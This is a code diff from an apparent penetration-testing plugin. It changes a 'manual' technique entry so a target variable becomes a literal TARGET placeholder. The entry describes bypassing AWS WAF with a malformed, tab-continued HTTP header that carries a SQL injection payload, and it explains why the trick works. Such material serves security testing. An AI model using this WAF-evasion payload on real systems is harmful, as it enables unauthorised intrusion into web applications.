@@ -1121,7 +1121,7 @@ class WebSecurityPlugin(ServicePlugin):
                     'type': 'manual',
                     'metadata': {
                         'description': 'Bypass AWS WAF using malformed HTTP headers (header continuation)',
-                        'command': f'# Create malformed header with payload on next line:\n# (Use Burp Repeater for raw request editing)\n# GET / HTTP/1.1\\r\\n\n# Host: {target}\\r\\n\n# X-Query: Benign-Value\\r\\n\n# \\t\' or \'1\'=\'1\' -- \\r\\n\n# Connection: close\\r\\n\n# \\r\\n\n\n# Tab character at line start = header continuation (RFC violation)',
+                        'command': '# Create malformed header with payload on next line:\n# (Use Burp Repeater for raw request editing)\n# GET / HTTP/1.1\\r\\n\n# Host: TARGET\\r\\n\n# X-Query: Benign-Value\\r\\n\n# \\t\' or \'1\'=\'1\' -- \\r\\n\n# Connection: close\\r\\n\n# \\r\\n\n\n# Tab character at line start = header continuation (RFC violation)',
                         'flag_explanations': {
                             '\\t': 'Tab character at line start (header continuation in HTTP)',
                             'X-Query: Value\\n\\t...': 'Multi-line header value (AWS parses wrong, backend accepts)',
